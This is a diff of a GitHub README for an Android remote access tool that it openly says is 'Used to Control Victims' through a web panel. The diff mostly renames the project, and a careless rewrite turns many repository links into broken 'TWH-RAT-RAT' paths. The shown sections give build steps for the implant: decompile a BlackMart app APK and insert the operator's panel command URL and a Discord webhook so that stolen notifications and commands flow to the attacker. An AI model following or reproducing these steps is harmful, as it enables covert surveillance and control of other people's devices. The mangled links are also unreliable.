@@ -1,15 +1,15 @@
 <p align="center">
   <img width="250" height="250" src="https://media.tenor.com/images/2c3668f83f251c47fe4319ed58961898/tenor.gif">
 </p>
-<h1 align="center">TWH</h1><p align="center">
-<b>TWH</b> is <b>Remote Access Tool</b> Used to Control Victims Using <b>WebPanel</b> With More Advance Features..
+<h1 align="center">TWH-RAT</h1><p align="center">
+<b>TWH-RAT</b> is <b>Remote Access Tool</b> Used to Control Victims Using <b>WebPanel</b> With More Advance Features..
 </p>   
 
 <p align=center>  
 <a href=https://github.com/nasirz11><img src="https://img.shields.io/badge/Author-nasirz11-red.svg?style=for-the-badge&label=Author" /></a>
 
 <img src="https://img.shields.io/badge/Version-1.0-brightgreen?style=for-the-badge" >
-<img src="https://img.shields.io/github/stars/nasirz11/TWH-RAT?style=for-the-badge">  
+<img src="https://img.shields.io/github/stars/nasirz11/TWH-RAT-RAT?style=for-the-badge">  
 <img src="https://img.shields.io/github/followers/nasirz11?label=Followers&style=for-the-badge">
 </p>   
 
@@ -55,7 +55,7 @@ OR
 ---
 ### Building Apk with ApkEasyTool:
 
-1. Download <a href="https://github.com/nasirz11/TWH-RAT/releases/download/release/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
+1. Download <a href="https://github.com/nasirz11/TWH-RAT-RAT/releases/download/release/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
 2. Open `InternalService.smali` 
 3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
 4. Now open `NotificationListener.smali` and enter replace with your discord webhook url
@@ -68,7 +68,7 @@ OR
 4. Note : Make Sure your webhosting site uses Https and should have valid connection...I recommend 000webhost.com
 5. You can now use panel to send commands and also refresh after it
 ---
-### TWH-RAT in Action [OLD] :
+### TWH-RAT-RAT in Action [OLD] :
 
 https://user-images.githubusercontent.com/46685308/120080601-603c5380-c0d7-11eb-82b2-345d0bff7581.mp4
 
@@ -78,7 +78,7 @@ Watch Video in Full Screen For Better Quality
 ## Screenshots[New]
 | | | |
 |:-------------------------:|:-------------------------:|:-------------------------:|
-|<a href="https://github.com/nasirz11/TWH-RAT/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> <img width="2000" src="https://github.com/nasirz11/TWH-RAT/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> Panel-1</a> | <a href="https://github.com/nasirz11/TWH-RAT/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> <img width="2000" src="https://github.com/nasirz11/TWH-RAT/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> Panel-2</a> |<a href="https://github.com/nasirz11/TWH-RAT/blob/main/Screenshots/Screenshot%20(72).png?raw=trueg"> <img width="2000" src="https://github.com/nasirz11/TWH-RAT/blob/main/Screenshots/Screenshot%20(72).png?raw=true"> Panel-3 </a>||
+|<a href="https://github.com/nasirz11/TWH-RAT-RAT/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> <img width="2000" src="https://github.com/nasirz11/TWH-RAT-RAT/blob/main/Screenshots/Screenshot%20(70).png?raw=true"> Panel-1</a> | <a href="https://github.com/nasirz11/TWH-RAT-RAT/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> <img width="2000" src="https://github.com/nasirz11/TWH-RAT-RAT/blob/main/Screenshots/Screenshot%20(71).png?raw=true"> Panel-2</a> |<a href="https://github.com/nasirz11/TWH-RAT-RAT/blob/main/Screenshots/Screenshot%20(72).png?raw=trueg"> <img width="2000" src="https://github.com/nasirz11/TWH-RAT-RAT/blob/main/Screenshots/Screenshot%20(72).png?raw=true"> Panel-3 </a>||
 
 ---
 
@@ -90,7 +90,7 @@ Watch Video in Full Screen For Better Quality
 --- 
 ## Disclaimer
 <b>nasirz11 Provides no warranty and will not be responsible for any direct or indirect damage caused by this tool.<br>
-TWH-RAT is built for Educational and Internal use ONLY.</b>
+TWH-RAT-RAT is built for Educational and Internal use ONLY.</b>
 
 ---
 
@@ -108,8 +108,8 @@ TWH-RAT is built for Educational and Internal use ONLY.</b>
 
 ---
 ### ❤️Supporters❤️
-[![Stargazers repo roster for @nasirz11/TWH-RAT](https://reporoster.com/stars/nasirz11/TWH-RAT)](https://github.com/nasirz11/TWH-RAT/stargazers)
-[![Forkers repo roster for @nasirz11/TWH-RAT](https://reporoster.com/forks/nasirz11/TWH-RAT)](https://github.com/nasirz11/TWH-RAT/network/members)
+[![Stargazers repo roster for @nasirz11/TWH-RAT-RAT](https://reporoster.com/stars/nasirz11/TWH-RAT-RAT)](https://github.com/nasirz11/TWH-RAT-RAT/stargazers)
+[![Forkers repo roster for @nasirz11/TWH-RAT-RAT](https://reporoster.com/forks/nasirz11/TWH-RAT-RAT)](https://github.com/nasirz11/TWH-RAT-RAT/network/members)
 
 ---
                         
